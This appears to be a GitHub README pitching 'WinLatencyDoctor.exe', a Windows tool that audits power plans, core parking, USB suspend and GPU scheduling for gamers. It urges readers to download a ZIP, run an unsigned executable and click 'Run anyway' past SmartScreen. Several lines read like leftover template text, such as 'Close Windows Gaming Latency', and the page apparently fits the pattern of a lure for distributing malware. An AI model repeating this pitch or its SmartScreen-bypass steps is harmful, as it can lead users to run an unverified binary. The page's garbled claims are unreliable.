<p align="center">
  <img src="https://i.postimg.cc/WzgKnbP9/banner.png" alt="WinTimer Latency Doctor — Windows Gaming Latency, Core Parking & Power Plan Diagnostics" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Latency%20%26%20Timer%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-win--latency--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# WinTimer Latency Doctor — Windows Gaming Latency, Core Parking & Power Plan Diagnostics

**High average FPS but sluggish mouse feel or random micro-stutter in shooters? CPU cores parking mid-game or Balanced power plans throttling boost clocks? Audit your Windows timer resolution, Core Parking, and power scheme in seconds.**

WinTimer Latency Doctor focuses on the Windows power and scheduling settings that directly impact `1% low FPS` and peripheral responsiveness: **hidden `Ultimate Performance` power schemes, aggressive CPU Core Parking, USB Selective Suspend on gaming mice/headsets, and Hardware-Accelerated GPU Scheduling (HAGS)**.

This project is aimed at **Windows 10 and Windows 11 PC gamers** seeking lower frame-time variance and consistent peripheral polling—not risky `bcdedit` kernel flags or disabling security mitigations.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Micro-stutter when flicking mouse or entering combat | Balanced power plan parking CPU cores or delaying frequency ramp-up | Unlock and activate `High Performance` / `Ultimate Performance` on desktop |
| Wireless mouse or USB DAC briefly stutters | Windows `USB Selective Suspend` powering down idle USB root hubs | Disable USB Selective Suspend in active power plan settings |
| Uneven frame pacing in DX12 / Frame Generation titles | Hardware-Accelerated GPU Scheduling (HAGS) or Game Mode disabled | Verify `HwSchMode` and `AutoGameModeEnabled` in Windows graphics settings |
| Unclear whether unsafe `bcdedit` tweaks were applied | Old YouTube 'FPS boost' guides altering `useplatformclock` or `tscsyncpolicy` | Inspect boot/timer configuration without applying harmful kernel flags |

## Download for Windows

[**Download WinLatencyDoctor.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/WinLatencyDoctor.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `WinLatencyDoctor.exe`? (Automatic checks in ~2 seconds)

- Inspects your active Windows Power Plan (`powercfg`) and checks CPU min/max processor state.
- Detects whether `USB Selective Suspend` is enabled on gaming mouse/audio ports.
- Checks `HwSchMode` (Hardware-Accelerated GPU Scheduling) and Windows `Game Mode` registry flags.
- Avoids harmful `bcdedit` timer hacks that degrade performance on modern Ryzen/Intel CPUs.

### Sample Diagnostic Output

```text
[WinLatencyDoctor] Auditing Windows power scheme, GPU scheduling & timer state...
[WARN] Active Power Plan: Balanced (CPU Core Parking active)
[INFO] Ultimate Perf.   : Available (Hidden scheme can be activated)
[WARN] USB Suspend      : Enabled (May cause brief USB mouse/audio hiccups)
[OK]   GPU Scheduling   : HAGS Enabled (HwSchMode = 2)
[OK]   Windows Game Mode: Enabled
```

The release ZIP is named `WinLatencyDoctor.zip`; the Windows executable inside is named `WinLatencyDoctor.exe`.

1. Close Windows Gaming Latency before moving or checking files.
2. Click **Download WinLatencyDoctor.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `WinLatencyDoctor.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Windows Gaming Latency and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit) on desktop or gaming laptop PCs.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `WinLatencyDoctor.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### CPU Core Parking causing sudden frame-time spikes

On multi-core Ryzen and Intel CPUs, Windows Balanced power plans park idle cores and introduce wake-up latency when a game suddenly spawns particle effects.

### USB Selective Suspend interrupting high-polling-rate mice

1000 Hz–8000 Hz gaming mice and USB audio interfaces can experience brief dropouts when Windows suspends idle USB hubs.

### Harmful `bcdedit` timer myths from outdated guides

Forcing `useplatformclock true` on modern Windows 10/11 systems often increases DPC latency instead of lowering it.

### Laptop vs. Desktop thermal/power profiles

Gaming laptops require preserving OEM thermal profiles while still disabling USB suspend and verifying HAGS.

## Where Windows Gaming Latency files normally belong

Windows stores graphics scheduling and power configuration across standard registry and `powercfg` settings:

```text
HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\
```

Inside that structure, key files and subdirectories typically look like this:

```text
Windows Latency & Power Targets:
├── HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\ (HwSchMode)
├── HKCU\Software\Microsoft\GameBar\ (AutoGameModeEnabled)
└── powercfg /getactivescheme (Processor & USB Suspend subgroups)
```

On gaming laptops (ASUS Armoury Crate, Lenovo Vantage, MSI Center), keep your OEM performance profile selected so fan curves remain properly controlled.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Check your active Windows Power Plan.** Switch from `Balanced` to `High Performance` or `Ultimate Performance` on desktop PCs.
2. **Disable USB Selective Suspend.** Prevents Windows from putting gaming mice, keyboards, and USB headsets into low-power sleep.
3. **Verify Hardware-Accelerated GPU Scheduling (HAGS).** Required for DLSS 3/4 Frame Generation and modern DX12 latency reduction.
4. **Keep Windows Game Mode enabled.** Helps Windows prioritize game threads over background notifications.
5. **Avoid forcing `useplatformclock` via `bcdedit`.** Leave default invariant TSC timers intact on modern processors.

### Before moving any files

Export your current power plan (`powercfg /export`) before switching schemes so you can revert with one click.

## What an effective diagnostic report should tell you

A clear latency check reports **active power scheme, USB suspend status, HAGS (`HwSchMode`), Game Mode, and CPU core configuration**.

## FAQ

**Should I enable Ultimate Performance power plan on a gaming laptop?**

On laptops, use your manufacturer's Performance mode so fan curves and thermal limits stay synchronized; Ultimate Performance is best for desktop PCs.

**Does this modify risky bcdedit kernel flags?**

No. It checks timer health without applying outdated `bcdedit` hacks.

**What is HAGS (Hardware-Accelerated GPU Scheduling)?**

It allows your GPU to manage its own VRAM scheduling directly, reducing CPU overhead and enabling Frame Generation.

**Can this fix network ping or packet loss?**

No. Network routing and DNS issues are separate from local Windows latency.

## Useful reading

- [DirectX Developer Blog — Windows Graphics & Frame Pacing](https://devblogs.microsoft.com/directx/)

## More Windows Game Diagnostic Tools

- [Win11-GamingDebloatGuard](../Win11-GamingDebloatGuard) — Windows 11 gaming optimizer & background process cleaner
- [NetPing-DNSGameSwitcher](../NetPing-DNSGameSwitcher) — Game server ping tester, Winsock reset & DNS switcher
- [DX12-ShaderCacheCleaner](../DX12-ShaderCacheCleaner) — GPU Shader Cache & DirectX 12 cleaner for NVIDIA & AMD
- [SteamJunction-LibraryMover](../SteamJunction-LibraryMover) — Move Steam/Epic games between SSDs via NTFS Junctions

*Independent open-source Windows utility. Not affiliated with Microsoft Corporation.*
 
 
 
 
 
 
 
 
 
